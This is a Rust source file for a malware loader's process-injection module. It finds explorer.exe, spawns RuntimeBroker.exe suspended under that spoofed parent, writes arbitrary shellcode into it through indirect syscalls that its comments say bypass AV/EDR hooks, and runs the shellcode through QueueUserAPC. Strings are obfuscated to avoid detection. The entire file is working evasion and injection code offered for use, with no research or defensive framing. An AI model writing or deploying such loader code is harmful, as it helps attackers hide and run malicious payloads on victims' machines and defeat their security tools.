//! Process Injection module for the loader
//!
//! Implements stealthy process injection techniques:
//! - Parent Process Spoofing (spawn under explorer.exe)
//! - QueueUserAPC injection
//! - Indirect syscalls via dinvk (bypasses AV/EDR hooks)

#[allow(unused_imports)]
use crate::syscalls;

/// Inject shellcode and execute using QueueUserAPC with Parent Process Spoofing
/// This creates a suspended process under explorer.exe and injects shellcode
#[cfg(target_os = "windows")]
pub fn inject_and_execute(shellcode: &[u8]) -> Result<(), String> {
    use obfstr::obfstr;

    // Step 1: Find explorer.exe PID for parent process spoofing
    let explorer_pid = find_explorer_pid()?;

    // Step 2: Create suspended process with spoofed parent
    let target_exe = obfstr!("C:\\Windows\\System32\\RuntimeBroker.exe").to_string();
    let (process_handle, thread_handle) =
        create_suspended_process_with_ppid(&target_exe, explorer_pid)?;

    // Step 3: Allocate memory in target process using indirect syscalls
    let remote_addr = syscalls::allocate_remote_memory(process_handle, shellcode.len())?;

    // Step 4: Write shellcode to target process
    syscalls::write_remote_memory(process_handle, remote_addr, shellcode)?;

    // Step 5: Change memory protection to executable
    syscalls::protect_remote_memory(process_handle, remote_addr, shellcode.len())?;

    // Step 6: Queue APC to execute shellcode
    queue_user_apc(thread_handle, remote_addr)?;

    // Step 7: Resume thread to trigger APC execution
    resume_thread(thread_handle)?;

    // Step 8: Close handles
    close_handle(process_handle);
    close_handle(thread_handle);

    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn inject_and_execute(_shellcode: &[u8]) -> Result<(), String> {
    Err("Process injection only supported on Windows".to_string())
}

/// Find explorer.exe PID for parent process spoofing
#[cfg(target_os = "windows")]
fn find_explorer_pid() -> Result<u32, String> {
    use obfstr::obfstr;
    use std::mem::zeroed;
    use winapi::shared::minwindef::FALSE;
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::tlhelp32::{
        CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
    };

    let explorer_name = obfstr!("explorer.exe").to_string();

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot.is_null() || snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return Err("Failed to create process snapshot".to_string());
        }

        let mut entry: PROCESSENTRY32 = zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut entry) == FALSE {
            CloseHandle(snapshot);
            return Err("Failed to get first process".to_string());
        }

        loop {
            // Convert szExeFile to string
            let exe_name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr())
                .to_string_lossy()
                .to_lowercase();

            if exe_name == explorer_name.to_lowercase() {
                let pid = entry.th32ProcessID;
                CloseHandle(snapshot);
                return Ok(pid);
            }

            if Process32Next(snapshot, &mut entry) == FALSE {
                break;
            }
        }

        CloseHandle(snapshot);
        Err("explorer.exe not found".to_string())
    }
}

#[cfg(not(target_os = "windows"))]
fn find_explorer_pid() -> Result<u32, String> {
    Err("Not supported on this platform".to_string())
}

/// Create a suspended process with spoofed parent PID
#[cfg(target_os = "windows")]
fn create_suspended_process_with_ppid(
    exe_path: &str,
    parent_pid: u32,
) -> Result<(*mut std::ffi::c_void, *mut std::ffi::c_void), String> {
    use std::ffi::c_void;
    use std::mem::{size_of, zeroed};
    use std::ptr;
    use winapi::shared::minwindef::FALSE;
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::processthreadsapi::{
        CreateProcessA, InitializeProcThreadAttributeList, OpenProcess, UpdateProcThreadAttribute,
        PROCESS_INFORMATION, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    };
    use winapi::um::winbase::{
        CREATE_NO_WINDOW, CREATE_SUSPENDED, EXTENDED_STARTUPINFO_PRESENT, STARTUPINFOEXA,
    };
    use winapi::um::winnt::PROCESS_ALL_ACCESS;

    unsafe {
        // Open parent process (explorer.exe)
        let parent_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parent_pid);
        if parent_handle.is_null() {
            return Err("Failed to open parent process".to_string());
        }

        // Initialize attribute list for PPID spoofing
        let mut attr_size: usize = 0;
        InitializeProcThreadAttributeList(ptr::null_mut(), 1, 0, &mut attr_size);

        let mut attr_list: Vec<u8> = vec![0u8; attr_size];
        let attr_list_ptr = attr_list.as_mut_ptr()
            as *mut winapi::um::processthreadsapi::LPPROC_THREAD_ATTRIBUTE_LIST;

        if InitializeProcThreadAttributeList(attr_list_ptr as *mut _, 1, 0, &mut attr_size) == FALSE
        {
            CloseHandle(parent_handle);
            return Err("Failed to initialize attribute list".to_string());
        }

        // Set parent process attribute
        let mut parent_handle_ref = parent_handle;
        if UpdateProcThreadAttribute(
            attr_list_ptr as *mut _,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
            &mut parent_handle_ref as *mut _ as *mut c_void,
            size_of::<*mut c_void>(),
            ptr::null_mut(),
            ptr::null_mut(),
        ) == FALSE
        {
            CloseHandle(parent_handle);
            return Err("Failed to update thread attribute".to_string());
        }

        // Setup STARTUPINFOEXA
        let mut si: STARTUPINFOEXA = zeroed();
        si.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as u32;
        si.lpAttributeList = attr_list_ptr as *mut _;

        let mut pi: PROCESS_INFORMATION = zeroed();

        // Create command line (needs to be mutable)
        let mut cmd_line = format!("{}\0", exe_path);
        let cmd_ptr = cmd_line.as_mut_ptr() as *mut i8;

        // Create suspended process
        let result = CreateProcessA(
            ptr::null(),
            cmd_ptr,
            ptr::null_mut(),
            ptr::null_mut(),
            FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
            ptr::null_mut(),
            ptr::null(),
            &mut si.StartupInfo,
            &mut pi,
        );

        CloseHandle(parent_handle);

        if result == FALSE {
            return Err("Failed to create process".to_string());
        }

        Ok((pi.hProcess as *mut c_void, pi.hThread as *mut c_void))
    }
}

#[cfg(not(target_os = "windows"))]
fn create_suspended_process_with_ppid(
    _exe_path: &str,
    _parent_pid: u32,
) -> Result<(*mut std::ffi::c_void, *mut std::ffi::c_void), String> {
    Err("Not supported on this platform".to_string())
}

/// Queue User APC to execute shellcode
#[cfg(target_os = "windows")]
fn queue_user_apc(
    thread_handle: *mut std::ffi::c_void,
    shellcode_addr: *mut std::ffi::c_void,
) -> Result<(), String> {
    use winapi::shared::minwindef::FALSE;
    use winapi::um::processthreadsapi::QueueUserAPC;

    unsafe {
        // SAFETY: shellcode_addr points to executable memory containing valid shellcode
        // that was allocated and written by our injection code. The memory has been
        // marked as PAGE_EXECUTE_READ. The APC callback signature matches PAPCFUNC
        // which expects a ULONG_PTR parameter (we pass 0).
        let apc_func: winapi::um::winnt::PAPCFUNC = std::mem::transmute(shellcode_addr);
        let result = QueueUserAPC(apc_func, thread_handle as *mut _, 0);

        if result == FALSE as u32 {
            return Err("Failed to queue APC".to_string());
        }

        Ok(())
    }
}

#[cfg(not(target_os = "windows"))]
fn queue_user_apc(
    _thread_handle: *mut std::ffi::c_void,
    _shellcode_addr: *mut std::ffi::c_void,
) -> Result<(), String> {
    Err("Not supported on this platform".to_string())
}

/// Resume suspended thread
#[cfg(target_os = "windows")]
fn resume_thread(thread_handle: *mut std::ffi::c_void) -> Result<(), String> {
    use winapi::um::processthreadsapi::ResumeThread;

    unsafe {
        let result = ResumeThread(thread_handle as *mut _);
        if result == u32::MAX {
            return Err("Failed to resume thread".to_string());
        }
        Ok(())
    }
}

#[cfg(not(target_os = "windows"))]
fn resume_thread(_thread_handle: *mut std::ffi::c_void) -> Result<(), String> {
    Err("Not supported on this platform".to_string())
}

/// Close handle
#[cfg(target_os = "windows")]
fn close_handle(handle: *mut std::ffi::c_void) {
    use winapi::um::handleapi::CloseHandle;
    unsafe {
        CloseHandle(handle as *mut _);
    }
}

#[cfg(not(target_os = "windows"))]
fn close_handle(_handle: *mut std::ffi::c_void) {}
